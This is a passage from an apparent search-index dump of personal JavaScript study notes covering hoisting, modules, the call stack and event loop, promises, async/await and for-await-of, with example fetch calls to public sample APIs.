<code>ReferenceError</code>. The variable is in a \"temporal dead zone\" from the start of the block until it is declared:</p> <pre><code>carName = \"Volvo\";\nlet carName;\n// Uncaught ReferenceError: Cannot access 'carName' before initialization\n</code></pre> </li> <li> <p>Using a <code>const</code> variable before it is declared, is a syntax errror, so the code will simply not run:</p> <pre><code>carName = \"Volvo\";\nconst carName;\n// Uncaught SyntaxError: Missing initializer in const declaration\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#function-expression-hoisting","title":"Function Expression Hoisting","text":"<ul> <li> <p>The left hand side (<code>var bar</code>) is a Variable Declaration. Variable Declarations get hoisted but their Assignment Expressions don\u2019t. So when <code>bar</code> is hoisted the interpreter initially sets <code>var bar = undefined</code>. The function definition itself is not hoisted.</p> <p>(ECMA 5 12.2 A variable with an initialzier is assigned the value of its AssignmentExpression when the VariableStatement is executed, not when the variable is created.)</p> <pre><code>function foo(){\nvar bar = function() {\nreturn 3;\n};\nreturn bar();\nvar bar = function() {\nreturn 8;\n};\n}\nalert(foo());\n\n// After the interpreter has finished with the code it runs more like this:\n//**Simulated processing sequence**\nfunction foo(){\n//a declaration for each function expression\nvar bar = undefined;\nvar bar = undefined;\n//first Function Expression is executed\nbar = function() {\nreturn 3;\n};\n// Function created by first Function Expression is invoked\nreturn bar();\n// second Function Expression unreachable\n}\nalert(foo()); //3\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#function-decalration-hoisting","title":"Function Decalration Hoisting","text":"<ul> <li> <p>When a function declaration is hoisted the entire function body is lifted with it.</p> <pre><code>function foo(){\nfunction bar() {\nreturn 3;\n}\nreturn bar();\nfunction bar() {\nreturn 8;\n}\n}\nalert(foo());\n\n// After the interpreter has finished with the code it runs more like this:\n//**Simulated processing sequence**\nfunction foo(){\n//define bar once\nfunction bar() {\nreturn 3;\n}\n//redefine it\nfunction bar() {\nreturn 8;\n}\n//return its invocation\nreturn bar(); //8\n}\nalert(foo()); // 8\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#strict-mode","title":"Strict Mode","text":"<p>reference: MDN</p> <ul> <li>ES5</li> <li>Is a way to opt in to a restricted variant of JavaScript, thereby implicitly opting-out of \"sloppy mode\"(normal mode). Strict mode isn't just a subset: it intentionally has different semantics from normal code. Browsers not supporting strict mode will run strict mode code with different behavior from browsers that do, so don't rely on strict mode without feature-testing for support for the relevant aspects of strict mode. Strict mode code and non-strict mode code can coexist, so scripts can opt into strict mode incrementally.</li> </ul>"},{"location":"Dev/Prg/Langs/Js/#modules","title":"Modules","text":"<p>Modules are pieces of code, grouped together, that can be combined together to create an expandable program that can get bigger as it needs to. Good modules are self contained and grouped together with their own specific functionality allowing them to be moved or deleted without breaking the program.</p> <ul> <li>Brief history of JavaScript Modules</li> <li>ES modules: A cartoon deep-dive</li> <li>JavaScript Modules: A Beginner\u2019s Guide</li> <li>JavaScript Modules Part 2: Module Bundling</li> <li>What Tool to Use: webpack vs Gulp vs Grunt vs Browserify</li> <li>Webpack \u2014 What is it and is it better than Gulp?</li> <li>Why webpack(form official docs){target=_blank}</li> <li>Parcel</li> <li>Why we have banned default exports in Javascript and you should do the same</li> <li> <p>JavaScript Modules: From IIFEs to CommonJS to ES6 Modules</p> <p></p> </li> <li> <p>JS \u043c\u043e\u0434\u0443\u043b\u0438 - \u043a\u0430\u043a \u0441\u0434\u0435\u043b\u0430\u0442\u044c \u044d\u043a\u0441\u043f\u043e\u0440\u0442 \u0438 \u0438\u043c\u043f\u043e\u0440\u0442. \u0424\u0443\u043d\u0434\u0430\u043c\u0435\u043d\u0442\u0430\u043b\u044c\u043d\u044b\u0439 JavaScript</p> <p></p> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#module-patterns","title":"Module Patterns","text":"<p>Originally in JavaScript, we had the module pattern. Before block scope came around, there was only global scope and function scope. To create this idea of modules, a module scope was implemented just above the function scope. This allowed variables to be shared, by exporting and importing, between the functions without having to go through the global scope. A function as a module is essentially just an immediately invoked function expression, IIFE.</p> <pre><code>var globalScopeVar = \"I can be accessed anywhere\";\n\nvar moduleName = (function(globalScopeVar) {\n// add private variables here\nvar privateVar = \"I cannot be accessed outside\";\n// create the function\nfunction say(msg1, msg2) {\nvar say1 = Math.floor(Math.random() * msg1.length);\nvar say2 = Math.floor(Math.random() * msg2.length);\nreturn say1 &gt; say2 ? say1 : say2;\n}\nglobalScopeVar = `I don't change the outside scope`;\n// return only what you want the outside to access\nreturn {\nsay: say\n};\n})(globalScopeVar);\n</code></pre>"},{"location":"Dev/Prg/Langs/Js/#issues-with-modules","title":"Issues with Modules","text":"<p>Even though modules help us to contain and organize code, there are still problems that can arise. There can be naming conflicts if you don't use const to declare the module. Also, there are dependency issues if scripts are placed in the wrong order, such as jQuery needing to be called before it can be used. Because of these problems, people started developing libraries to solve them. Before ES6 we had 2 ways to implement modules in JavaScript CommonJS and AMD.</p> <ul> <li> <p>CommonJS - uses the keywords require and exports to interact with the module system. <code>require</code> is a function used to import from another module and <code>exports</code> is an object where functions get exported from. These are run synchronously where we wait on one module to load before another can start and this is not ideal for browsers. However, this code may look familiar because NodeJS still uses this library. There are other packages such as Browserify and Webpack that aid in bundling scripts with CommonJS to be used in the browsers.</p> </li> <li> <p>Asynchronous Module Definition (AMD) - as in the name, AMD loads modules asynchronously. This was great for browsers early on before packages that bundled code. <code>define(['module1', 'module2'], function(module1, module2) {console.log(module1.setName());});</code> The define function takes an array of dependency modules that are loaded in a non-blocking manner in the background. Once completed, the callback function is then executed. Packages came out like RequireJS that implemented the AMD endpoint and was the main way people used AMD modules.</p> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#es6-modules","title":"ES6 Modules","text":"<p>After ES6 came out, pretty much everything above was thrown out the window with 2 new keywords. We can now use the export and import keywords in our files to implement modules. This again may look familiar from popular frameworks like React.</p> <pre><code>import module1 from \"module1\";\nimport module2 from \"module2\";\n\nexport function name() {}\n</code></pre> <p>Here is our module code from above in the new ES6 syntax.</p> <pre><code>const privateVar = \"I cannot be accessed outside this file\";\n\nexport function name(msg1, msg2) {\nconst say1 = Math.floor(Math.random() * msg1.length);\nconst say2 = Math.floor(Math.random() * msg2.length);\nreturn say1 &gt; say2 ? say1 : say2;\n}\n</code></pre> <p>There are 2 types of exports, named and default. A named export is imported using curly braces(<code>{ importFnName }</code>) and a default function is added and created like this:</p> <pre><code>import { importFnName } from \"./script.js\";\n// with a default function the {} are not needed\nimport name from \"./script.js\";\n// both default and named function import\nimport name, { importFnName } from \"./script.js\";\n\nexport default function name(msg1, msg2) {\nconst say1 = Math.floor(Math.random() * msg1.length);\nconst say2 = Math.floor(Math.random() * msg2.length);\nreturn say1 &gt; say2 ? say1 : say2;\n}\n</code></pre> <p>Trying to run this in the browser there is still 2 more things that have to be done. You have to declare the type in the html script tag as module and the file has to be served from a server. You can spin up your own server with a package like live-server on npm.</p> <pre><code>&lt;script type=\"module\" src=\"./script.js\"&gt;&lt;/script&gt;\n</code></pre>"},{"location":"Dev/Prg/Langs/Js/#json-vs-form-data","title":"JSON vs Form Data","text":"<p>Originally, the only way to submit some form data to a server was through the <code>&lt;form&gt;</code> tag in HTML. It can do a POST or a GET request. With JSON we can now grab the contents of the <code>&lt;input&gt;</code> in a form and submit those with JSON instead of as a form data. We can now submit to the server whenever we want without it necessarily being a <code>&lt;form&gt;</code>, through AJAX.</p>"},{"location":"Dev/Prg/Langs/Js/#service-workers","title":"Service workers","text":"<p>Google Developers</p> <p>Service workers enable applications to control network requests, cache those requests to improve performance, and provide offline access to cached content.</p>"},{"location":"Dev/Prg/Langs/Js/#asynchronicity","title":"Asynchronicity","text":"<p>Learning Sources</p> <ul> <li> <p>Asynchronous JavaScript Course (Async/Await, Promises, Callbacks)</p> <p></p> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#how-program-works","title":"How program works?","text":"<ul> <li> <p>Each promgram has to do 2 simple things:</p> <ol> <li> <p>Allocate memory: To be able to have variables or even have a file on our computer.</p> </li> <li> <p>Parse and execute scripts: Read and run commands.</p> </li> </ol> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#how-javascript-engine-works","title":"How Javascript Engine works?","text":"blog.sessionstack.com <ul> <li> <p>Javascript engine(that each browser implements) - reads the javascript that we write and changes into machine executable instructions for the browser. It has two parts:</p> <ol> <li> <p>Memory Heap: This is where the memory allocation happens. It has a limited amount</p> <pre><code>// allocation of a memory in the memory heap occurs when we assign value to a variable\nconst a = 1;\nconst b = 10;\nconst c = 100;\n</code></pre> <p>Note</p> <p>Memory Leak occures when we fill up memory heap with unused global variables and eventually the browser will not be able to work.</p> </li> <li> <p>Call Stack: This is where our code is read and executed. It tells us where we are in the program.</p> <p>Call Stack reads our code line by line. Each time it encounters a function it gets put onto the stack and excuted immediately. So functions in our code executed in order they appear in code and eventually call stack become empty.</p> <p>When there are nested functions the call stack will add each of those functions on top of its partent every time it's encounters them and eventually start execution from the last one. So in case of nested functions call stack uses LIFO(Last In First Out) method.</p> <pre><code>const one = () =&gt; {\nconst two = () =&gt; {\nconsole.log('hi')\n}\ntwo()\n};\none();\n\n// what on the top of call stack gets run first, and gets remove first\nconsole.log('hi')\ntwo()\none()\n// CALL STACK\n</code></pre> <p>Note</p> <p>Other languages can have multiple call stacks and these are called Multi Threaded. But complicated scenarios/issues may arise in multithreaded environment such as Deadlocks.</p> <p>Stackoverflow happens when the call stack just gets bigger and bigger until it just doesn't have enough space anymore.</p> <pre><code>// stackoverflow can be created using recursion\n// so here we keep adding foo() to the callstack\nfunction foo() {\nfoo()\n}\n\nfoo()\n</code></pre> <p> blog.sessionstack.com </p> </li> </ol> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#how-javascript-works","title":"How Javascript works?","text":"<p>Javascript as a single threaded language that can be non-blocking.</p> <p>Single threaded: Has only one call stack, so only one statement is executed at a time.</p> <p>And so we have  definition of synchronous programming that means line two of code gets executed only after line one finished. If a task takes a long time, then consequent tasks get freeze, so actually the first task blocks our single thread(call stack).</p> <p>Non-blocking: In order to not block the single thread, it can be asynchronous with callback functions and these callback functions gets run in the background, through the callback queue and then the event loop, to bring it back to the call stack. And that is asynchronous programming. To achive it we use asynchronous functions such as setTimeOut().</p> <p><code>setTimeOut()</code> Window/WorkerGlobalScope method is a part of browser's Web API and it sets a timer which executes a function or specified piece of code once the timer expires(MDN reference).</p> <pre><code>//not from javascript but the web API\nconsole.log('0')\nsetTimeout(() =&gt; console.log('1'),2000) // 2 seconds\nconsole.log('2')\n// 0 2 1  because callback() after call stack is empty\n\nsetTimeout(..., 2000)  // web api starts a timer here defined by setTimeout()(2 sec. in our case)\n// after this time limit is up web api sends the callback function \"() =&gt; console.log('1')\" to the callback queue\n\ncallback()  console.log()\n//CALL STACK\n\n//WEB API\n\ncallback()\n//CALLBACK QUEUE\n\n//EVENT LOOP\n// keeps checking at each tick(amount of time which the event loop makes a check) whether call stack is empty,\n// once empty, put callback to the call stack,\n// like eventListener that checks whether there is a click and do callback\n</code></pre> <p></p> blog.sessionstack.com <p>Note</p> <p>Callback Queue also holds an eventListener's callbacks.</p>"},{"location":"Dev/Prg/Langs/Js/#promise","title":"Promise","text":"<ul> <li>MDN(Promise)</li> <li>MDN(Using Promises)</li> <li>JavaScript Promises: an introduction</li> <li>Master the JavaScript Interview: What is a Promise?</li> <li> \u0427\u0442\u043e \u0442\u0430\u043a\u043e\u0435 \u043f\u0440\u043e\u043c\u0438\u0441\u044b \u0432 JavaScript. \u0424\u0443\u043d\u0434\u0430\u043c\u0435\u043d\u0442\u0430\u043b\u044c\u043d\u044b\u0439 JavaScript</li> <li> \u0423\u0440\u043e\u043a 5. JavaScript. Promise. \u0427\u0442\u043e \u044d\u0442\u043e, \u043a\u0430\u043a \u0440\u0430\u0431\u043e\u0442\u0430\u0435\u0442 (+ \u043f\u0440\u0438\u043c\u0435\u0440)</li> </ul> <ul> <li> <p>ES6.</p> </li> <li> <p>A promise is an object that may produce a single value sometime in the future: either a resolved value(<code>Promise\u00a0{&lt;fulfilled&gt;: resolved-value}</code>), or a reason that it's not resolved(<code>Promise\u00a0{&lt;rejected&gt;: resolved-value-as-rejected-reason}</code>).</p> </li> <li> <p>A promise maybe in one of three possible states(<code>[[PromiseState]]</code>): <code>&lt;fulfilled&gt;</code>(resolved), <code>&lt;rejected&gt;</code> or <code>&lt;pending&gt;</code>.</p> </li> <li> <p>So at their most basic promises are a bit like event listeners except a promise can only succeed or fail once. It cannot succeed or fail twice.</p> <p>And this is extremely useful for things that are asynchronous success and failure such as API calls because we're less interested in the exact time something became available and more interested in reacting to the outcome. So we're reacting to something that happens asynchronously.</p> </li> <li> <p>Promise creation:</p> <p>A promise is something that we have now that we can use around our code even though we don't have the value just yet. We can just assign it to a variable.</p> <pre><code>// creating promise instance from the Promise class constructor\nconst promise = new Promise((resolve, reject) =&gt; {\nif (true) {\nresolve('Stuff Worked');\n} else {\nreject('Error, it broke')\n}\n})\n</code></pre> </li> <li> <p>Promise usage - When to use:</p> <p>Promises are great for asynchronous programming when we don't want javascript to block the execution of our code(so that the task happens in the background), e.g.:</p> <p>1. Using async functions, e.g. making back-end or API calls using <code>fetch()</code> function that return us a promise</p> <p>OR</p> <p>2. Using 'new Promise()', e.g. grabbing data from a database(e.g. transforming 30,000 datarows) or maybe optimizing an image</p> <p>When the promise gets resolved or rejected then we'll get the response.</p> </li> <li> <p>Promise usage - Instance methods:</p> <p>.then</p> <p><code>.then()</code> produce synchronous result. This method receives the resolved value of the promise to which it gets chained onto.</p> <pre><code>promise.then(result =&gt; console.log(result)); // Stuff Worked\n\n// OR\n\npromise.then(console.log); // Stuff Worked\n\n// promises chaining\npromise\n.then(result =&gt; result + '!')\n.then(result2 =&gt; {\nconsole.log(result2); // Stuff Worked!\n})\n</code></pre> <p><code>promise.then(console.log);</code> - This is behind the scenes Javascript magic. The first argument of the <code>.then</code> is a function which can work on with the resolved value. By using <code>console.log</code> only, the resolved value gets passed automatically into it which will print it out into the dev tools console.</p> <p>.catch</p> <p><code>.catch()</code> can catch failure and we get only the <code>.catch()</code> return when a promise gets rejected or if an error happens, good for fetch api</p> <pre><code>promise\n.then(result =&gt; result + '!')\n.then(result2 =&gt; {\nthrow Error\nconsole.log(result2); // we DO NOT get output here\n})\n.catch(() =&gt; console.log('errror!')) // errror!\n</code></pre> <p><code>.catch</code> catches ANY errors that may happen between the chains <code>.then</code>. So if we moving the <code>throw Error</code> to the first <code>.then</code> we still only get the 'error!'</p> <pre><code>promise\n.then(result =&gt; {\nthrow Error\nreturn result + '!'\n})\n.then(result2 =&gt; {\nconsole.log(result2); // we DO NOT get output here\n})\n.catch(() =&gt; console.log('errror!')) // errror!\n</code></pre> <p>But catching errors happens only between the chains <code>.then</code> that are located above the <code>.catch</code></p> <pre><code>promise\n.then(result =&gt; result + '!')\n.then(result2 =&gt; result2 + '?')\n.catch(() =&gt; console.log('errror!'))// we DO NOT get output here\n.then(result3 =&gt; {\nthrow Error; // Uncaught (in promise) \u0192 Error() { [native code] }\nconsole.log(result3 + '!');\n})\n</code></pre> <p>.finally()</p> <p><code>.finally()</code> allows us to do something after a promise has finished. We add it usually at the end of the promise. The <code>finally()</code> block will be called regardless of whether <code>.then()</code> works or the promise is catches into an error. <code>.finally()</code> usually doesn't receive anything from the promise so it has no parameters.</p> <p><code>.finally()</code> is great for those times that you need to run a piece of code no matter what.<p>For instanse sending an email to a user regardless of whether their request was successful or failed; or showing a little notification icon.</p> </p> <pre><code>const urls = [\n'http://swapi.dev/api/people/1',\n'http://swapi.dev/api/people/2',\n'http://swapi.dev/api/people/3',\n'http://swapi.dev/api/people/4'\n]\n\nPromise.all(urls.map(url =&gt; fetch(url).then(resp =&gt; resp.json())))\n.then(results =&gt; results.map(((result,i) =&gt; console.log(++i, result))))\n.catch(() =&gt; console.log('error'))\n.finally(() =&gt; console.log('extra'))\n</code></pre> </li> <li> <p>Promise usage - Static methods:</p> <p>Promise.resolve</p> <p><code>Promise.resolve(value)</code> - Returns a new <code>Promise</code> object that is resolved with the given value. If the value is a thenable (i.e. has a <code>then</code> method), the returned promise will \"follow\" that thenable, adopting its eventual state; otherwise, the returned promise will be fulfilled with the value.</p> <pre><code>// creating promise using Promise constructor method\nconst promise = new Promise((resolve, reject) =&gt; {\nsetTimeout(() =&gt; {\nresolve(\"success\");\n}, 4000)\n});\n\n// VS\n\n// creating promise using Promise.resolve\nconst promise = Promise.resolve(\nsetTimeout(() =&gt; {\nconsole.log(\"success\");\n}, 4000)\n);\n</code></pre> <p>Promise.reject</p> <p><code>Promise.reject(reason)</code> - Returns a new <code>Promise</code> object that is rejected with the given reason.</p> <pre><code>Promise.reject('failed')\n.catch(console.log('Ooops something went wrong'))\n</code></pre> <p>Promise.all</p> <p><code>Promise.all(iterable)</code> - Wait for all promises to be resolved, or for any to be rejected.</p> <p>If the returned promise resolves, it is resolved with an aggregating array of the values from the resolved promises, in the same order as defined in the iterable of multiple promises.</p> <p>If it rejects, it is rejected with the reason from the first promise in the iterable that was rejected.</p> <p>Example 1 of defining 3 promises and immediately running Promise.all after that:</p> <pre><code>const promise1 = new Promise((resolve, reject) =&gt; {\nsetTimeout(resolve, 100, 'HIII') // Essentially this is saying, \"resolve('HIII') in 100 millisecond\"\n})\n\nconst promise2 = new Promise((resolve, reject) =&gt; {\nsetTimeout(resolve, 1000, 'POOKIE')\n})\n\nconst promise3 = new Promise((resolve, reject) =&gt; {\nsetTimeout(resolve, 5000, 'Is it me you are looking for?')\n})\n\nPromise.all([promise1, promise2, promise3])\n.then(values =&gt; {\nconsole.log(values); // output after 5 seconds =&gt; [\"HIII\", \"POOKIE\", \"Is it me you are looking for?\"]\n})\n</code></pre> <p>If we assign the variables(promise1, promise2 etc.) first and only then run <code>Promise.all</code> ,the result <code>[\"HIII\", \"POOKIE\", \"Is it me you are looking for?\"]</code> will be instant, because we've assigned all promises to their variables and between the time that we copied and pasted <code>Promise.all ...</code> to console these promises in the background have been resolved.</p> <p>Example 2 from real world apps using Fetch api showing the idea of when we want to use promises:</p> <p>Note</p> <p><code>fetch('url')</code> always returns a promise</p> <pre><code>const urls = [\n'https://jsonplaceholder.typicode.com/users',\n'https://jsonplaceholder.typicode.com/posts',\n'https://jsonplaceholder.typicode.com/albums',\n]\n\nPromise.all(urls.map(url =&gt; {\nreturn fetch(url).then(resp =&gt; resp.json())\n})).then(results =&gt; {\nconsole.log(results[0])\nconsole.log(results[1])\nconsole.log(results[2])\n}).catch(() =&gt; console.log('error')) // here we can catch 'reject' from a promise and we can do whatever we want with this error\n\n/* (10) [{\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}]\n(100) [{\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}]\n(100) [{\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}, {\u2026}] */\n</code></pre> <p>Promise.allSettled</p> <p><code>Promise.allSettled(iterable)</code> - Wait until all promises have settled (each may resolve or reject).</p> <p>Returns a Promise that resolves after all of the given promises have either resolved or rejected, with an array of objects that each describe the outcome of each promise.</p> <pre><code>const promiseOne = new Promise((resolve, reject) =&gt;\nsetTimeout(resolve, 6000))\nconst promiseTwo = new Promise((resolve, reject) =&gt;\nsetTimeout(reject, 3000))\n\n// Even though the first promise that returns(after 3 sec.) is rejected .allSettled doesn't care.\n// It just checks for 6 sec. until all the promises are returned.\nPromise.allSettled([promiseOne, promiseTwo]).then(data =&gt; console.log(data))\n.catch(e =&gt; console.log('something failed', e));\n</code></pre> <p>Promise.any</p> <p><code>.any()</code> resolves if any of the supplied promises is resolved. When none of the promises resolve then error is thrown.</p> <pre><code>const p1 = new Promise((resolve, reject) =&gt; {\nsetTimeout(() =&gt; resolve(\"A\"), Math.floor(Math.random() * 1000));\n});\nconst p2 = new Promise((resolve, reject) =&gt; {\nsetTimeout(() =&gt; resolve(\"B\"), Math.floor(Math.random() * 1000));\n});\nconst p3 = new Promise((resolve, reject) =&gt; {\nsetTimeout(() =&gt; resolve(\"C\"), Math.floor(Math.random() * 1000));\n});\n\n// Out of p1, p2 and p3, whichever resolves first is taken by `.any()`\n(async function () {\nconst result = await Promise.any([p1, p2, p3]);\nconsole.log(result); // Prints \"A\", \"B\" or \"C\"\n})();\n</code></pre> </li> <li> <p>Promises serve the same purpose as callbacks.</p> <pre><code>// callback pyramid of doom\nmovePlayer(100, 'Left', function() {\nmovePlayer(400, 'Left', function() {\nmovePlayer(10, 'Right', function() {\nmovePlayer(330, 'Left', function() {\n});\n});\n});\n});\n\n// same code as above using Promise\nmovePlayer(100, 'Left')\n.then(() =&gt; movePlayer(400, 'Left'))\n.then(() =&gt; movePlayer(10, 'Right'))\n.then(() =&gt; movePlayer(330, 'Left'))\n</code></pre> </li> <li> <p>Promise usage - parallel, race, sequense</p> <pre><code>const promisify = (item, delay) =&gt;\nnew Promise((resolve) =&gt;\nsetTimeout(() =&gt;\nresolve(item), delay));\n\nconst a = () =&gt; promisify('a', 100);\nconst b = () =&gt; promisify('b', 5000);\nconst c = () =&gt; promisify('c', 3000);\n// console.log(a(), b(), c())\n\nasync function parallel() {\nconst promises = [a(), b(), c()];\nconst [output1, output2, output3] = await Promise.all(promises);\nreturn `prallel is done: ${output1} ${output2} ${output3}`\n}\n\nasync function race() {\nconst promises = [a(), b(), c()];\nconst output1 = await Promise.race(promises);\nreturn `race is done: ${output1}`;\n}\n\nasync function sequence() {\nconst output1 = await a();\nconst output2 = await b();\nconst output3 = await c();\nreturn `sequence is done: ${output1} ${output2} ${output3}`\n}\n\n\nparallel().then(console.log);\nsequence().then(console.log);\nrace().then(console.log);\n\n// race is done: a\n// prallel is done: a b c\n// sequence is done: a b c\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#asyncawait","title":"async...await","text":"<ul> <li> <p>ES8.</p> </li> <li> <p>Async await code are just promises underneath the hood. It's called syntactic sugar something that still does the same thing but is just different syntax to make it look prettier.</p> </li> <li> <p>The goal with async await is to make code look synchronous - a code that's asynchronous looks synchronous.</p> </li> <li> <p>Syntax:</p> <pre><code>// using Promises\nmovePlayer(100, 'Left')\n.then(() =&gt; movePlayer(400, 'Left'))\n.then(() =&gt; movePlayer(10, 'Right'))\n.then(() =&gt; movePlayer(330, 'Left'))\n\n// same code using Async...Await\nasync function playerStart() {\nawait movePlayer(100, 'Left');  //pause\nawait movePlayer(400, 'Left');  //pause\nawait movePlayer(10, 'Right');  //pause\nawait movePlayer(330, 'Left');  //pause\n}\n</code></pre> <p>async - We first declare a function as async letting javascript to know \"Hey this is an async function\". And we declare it with the word <code>function</code> and then a function name. Also we can use function expression with <code>async</code> keyword before <code>function()</code>, e.g. <code>const getData = async function() {...}</code>.</p> <p>await - we have access to this keyword after we declared function with <code>async</code> keyword. <code>await</code> before a function means \"pause the(<code>playerStart()</code>) function until I have something for you\", so we're awaiting the response. We can use <code>await</code> keyword in front of any function that returns a promise. Once the promise is resolved then the function(<code>playerStart()</code>) moves to the next line and it awaits the next function.</p> <p>So the <code>await</code> keyword doesn't really do anything different than what a promise does. Since async functions pause their execution at any \u201cawait\u201d keyword to wait for asynchronous expressions to resolve, they themselves become asynchronous (and hence why they have the <code>async</code> keyword in front of them). So the js engine keeps running code and will get back to the asynchronous function when the promise is returned.</p> </li> <li> <p>The benefit of using <code>async..await</code> is that we can now assign variables to functions with <code>await</code> in front of them like we do in synchronous programming. These variables will keep the result of each function.</p> <pre><code>async function playerStart() {\nconst first = await movePlayer(100, 'Left');  //pause\nconst second = await movePlayer(400, 'Left');  //pause\nconst third = await movePlayer(10, 'Right');  //pause\nconst fourth = await movePlayer(330, 'Left');  //pause\n}\n</code></pre> </li> <li> <p>More realistic examples with fetch API:</p> <pre><code>// using Promises and .then notation\nfetch('https://jsonplaceholder.typicode.com/users')\n.then(resp =&gt; resp.json())\n.then(console.log)\n\n// same code using Async...Await(Syntactic Sugar)\nasync function fetchUsers() {\nconst resp = await fetch('https://jsonplaceholder.typicode.com/users')\nconst data = await resp.json();\nconsole.log(data);\n}\n\nfetchUsers()\n\n// in the code above we can wrap the code inside of the function within a `try...catch` block to catch errors\n// OR we can even use a `.catch` with async/await:\nasync function fetchUsers() {\nconst resp = await fetch('https://jsonplaceholder.typicode.com/users').catch(err =&gt; console.log('ooops', err))\nconst data = await resp.json();\nconsole.log(data);\n}\n\nfetchUsers()\n</code></pre> <pre><code>// using Promise.all\nconst urls = [\n'https://jsonplaceholder.typicode.com/users',\n'https://jsonplaceholder.typicode.com/posts',\n'https://jsonplaceholder.typicode.com/albums',\n]\n\nPromise.all(urls.map(url =&gt;\nfetch(url).then(resp =&gt; resp.json())\n)).then(array =&gt; {\nconsole.log('users', array[0])\nconsole.log('posts' , array[1])\nconsole.log('albums' , array[2])\n}).catch(() =&gt; console.log('oops'))\n\n// same code using Async...Await(Syntactic Sugar)\nconst getData = async function() {\ntry {\nconst [ users, posts, albums ] = await Promise.all(urls.map(url =&gt;\nfetch(url).then(resp =&gt; resp.json())\n))\nconsole.log('uaers', users)\nconsole.log('posts' , posts)\nconsole.log('albums' , albums)\n} catch(err) {\nconsole.log('oops', err)\n}\n}\n\ngetData()\n\n// ADVANCED: Update of the above code to also have\n// async await for this line: fetch(url).then(resp =&gt; resp.json())\n// so there is no .then() calls anymore\nconst getData = async function () {\ntry {\nconst [ users, posts, albums ] = await Promise.all(\nurls.map(async function (url) {\nconst response = await fetch(url);\nreturn response.json();\n}),\n);\nconsole.log(\"users\", users);\nconsole.log(\"posta\", posts);\nconsole.log(\"albums\", albums);\n} catch (err) {\nconsole.log(\"oops\", err);\n}\n};\n\ngetData()\n\n// ADVANCED - Another solution: without Promise.all and using array functions\nconst fetchAll = urls =&gt; {//no async\nurls.map(async url =&gt; {\ntry {\nconst resp = await fetch(url);\nconst data = await resp.json();\nconsole.log(data);\n}\ncatch (err) {\nconsole.log('error', err);\n}\n});\n}\n\nfetchAll(urls);\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#for-await-of","title":"for await of","text":"<p>The only thing that the <code>for await of</code> does it allows us to loop through multiple promises (almost as if we're writing synchronous code) and returns to us in the correct order all the responses.</p> <pre><code>const urls = [\n'https://jsonplaceholder.typicode.com/users',\n'https://jsonplaceholder.typicode.com/posts',\n'https://jsonplaceholder.typicode.com/albums',\n]\n\nconst getData = async function() {\nconst arrayOfPromises = urls.map(url =&gt; fetch(url));\nfor await (let request of arrayOfPromises) {\nconst data = await request.json();\nconsole.log(data);\n}\n}\n\ngetData()\n</code></pre>"},{"location":"Dev/Prg/Langs/Js/Dom/","title":"Document Object Model","text":""},{"location":"Dev/Prg/Langs/Js/Dom/#preface-browser-environment-specs","title":"Preface: Browser environment, specs","text":"<p>Read more from source.</p> <p>The JavaScript language was initially created for web browsers. Since then, it has evolved into a language with many uses and platforms.</p> <p>A platform may be a browser, or a web-server or another host, or even a \u201csmart\u201d coffee machine if it can run JavaScript. Each of these provides platform-specific functionality. The JavaScript specification calls that a host environment.</p> <p>A host environment provides its own objects and functions in addition 